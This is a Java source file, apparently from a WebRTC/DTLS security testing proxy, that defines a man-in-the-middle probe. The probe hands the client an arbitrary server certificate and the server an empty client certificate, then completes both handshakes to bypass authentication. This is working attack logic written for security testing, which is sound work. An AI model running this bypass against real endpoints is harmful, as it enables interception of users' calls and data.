/*
 * WebRTC-DTLS-Analysis-Proxy
 *
 * Copyright 2022-2025 Technology Innovation Institute (TII), Abu Dhabi
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */
package de.rub.nds.dtlsproxy.probes.rtp.dtlsbypass;

import de.rub.nds.dtlsproxy.config.ProxyConfiguration;
import de.rub.nds.dtlsproxy.enums.WebRtcProperties;
import de.rub.nds.dtlsproxy.report.WebRtcPlatformReport;
import de.rub.nds.dtlsproxy.util.TraceUtil;
import de.rub.nds.dtlsproxy.util.X509Util;
import de.rub.nds.modifiablevariable.util.Modifiable;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.protocol.message.*;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.action.*;

public class EmptyClientCertBogusServerCertBypass extends AuthBypass {

    public EmptyClientCertBogusServerCertBypass() {
        super(
                "present unexpected arbitrary server certificate, present empty client certificate",
                true,
                true);
    }

    /**
     * Creates a MitM trace based on the assumption that the client does not check the certificate
     * and the server accepts empty certificates.
     *
     * <pre>
     *
     * Client                    MitM                  Server
     * -------------------------------------------------------
     * |---ClientHello--->|    Forward    |---ClientHello--->|
     * |<---SH,CRT,SKX----|      Send
     *                       Receive Till |<-----SH Done-----|
     *                           Send     |---- empty CRT -->|
     *                       Dynamic Send |-------CKE------->|
     * |------FIN------->|   Receive Till
     * |<----NST,FIN-----|       Send
     *                           Send     |----CV,CCS,FIN--->|
     *                       Receive Till |<------FIN--------|
     *
     * </pre>
     */
    @Override
    public WorkflowTrace createTrace(
            WebRtcPlatformReport report, ProxyConfiguration proxyConfiguration) {

        Config config = createConfig(proxyConfiguration, report);

        WorkflowTrace trace =
                TraceUtil.createMitmEntryTrace(
                        config,
                        ATTACKER_TO_SERVER_CONNECTION,
                        CLIENT_TO_ATTACKER_CONNECTION,
                        report);

        // forward Victim CH to Server
        trace.addTlsAction(
                new ForwardMessagesAction(
                        CLIENT_TO_ATTACKER_CONNECTION,
                        ATTACKER_TO_SERVER_CONNECTION,
                        new ClientHelloMessage()));

        // send Attacker SH to victim
        trace.addTlsAction(
                new SendAction(
                        CLIENT_TO_ATTACKER_CONNECTION,
                        new ServerHelloMessage(config),
                        new CertificateMessage()));
        trace.addTlsAction(new SendDynamicServerKeyExchangeAction(CLIENT_TO_ATTACKER_CONNECTION));
        trace.addTlsAction(
                new SendAction(
                        CLIENT_TO_ATTACKER_CONNECTION,
                        new CertificateRequestMessage(config),
                        new ServerHelloDoneMessage()));

        // receive Server SH
        trace.addTlsAction(
                new ReceiveTillAction(ATTACKER_TO_SERVER_CONNECTION, new ServerHelloDoneMessage()));

        // send Attacker FIN to server
        CertificateMessage certificateMessage = new CertificateMessage();
        certificateMessage.setCertificatesListBytes(Modifiable.explicit(new byte[0]));
        trace.addTlsAction(new SendAction(ATTACKER_TO_SERVER_CONNECTION, certificateMessage));
        trace.addTlsAction(new SendDynamicClientKeyExchangeAction(ATTACKER_TO_SERVER_CONNECTION));
        trace.addTlsAction(
                new SendAction(
                        ATTACKER_TO_SERVER_CONNECTION,
                        new ChangeCipherSpecMessage(),
                        new FinishedMessage()));

        // receive Victim FIN
        trace.addTlsAction(
                new ReceiveTillAction(CLIENT_TO_ATTACKER_CONNECTION, new FinishedMessage()));

        TraceUtil.optionallyAddSessionTicketMessage(trace, report, CLIENT_TO_ATTACKER_CONNECTION);

        // send Attacker FIN to victim
        trace.addTlsAction(
                new SendAction(
                        CLIENT_TO_ATTACKER_CONNECTION,
                        new ChangeCipherSpecMessage(),
                        new FinishedMessage()));

        // receive Server FIN
        trace.addTlsAction(
                new ReceiveTillAction(ATTACKER_TO_SERVER_CONNECTION, new FinishedMessage()));

        return trace;
    }

    @Override
    public Config createConfig(ProxyConfiguration configuration, WebRtcPlatformReport report) {
        Config config = super.createConfig(configuration, report);
        X509Util.applySupportedSignatureAndHashAlgorithm(config, report, false);
        return config;
    }

    @Override
    public boolean isApplicable(WebRtcPlatformReport report) {

        if (!basicExecutionRequirementsMet(report)) {
            return false;
        }
        if (!isTrue(report, WebRtcProperties.SERVER_REQUESTS_CERTIFICATE)) {
            return false;
        }
        if (!isFalse(report, WebRtcProperties.SERVER_NOTICES_EMPTY_CERT)) {
            return false;
        }
        if (!isFalse(report, WebRtcProperties.CLIENT_VERIFIES_CERTIFICATE)) {
            return false;
        }

        return true;
    }
}
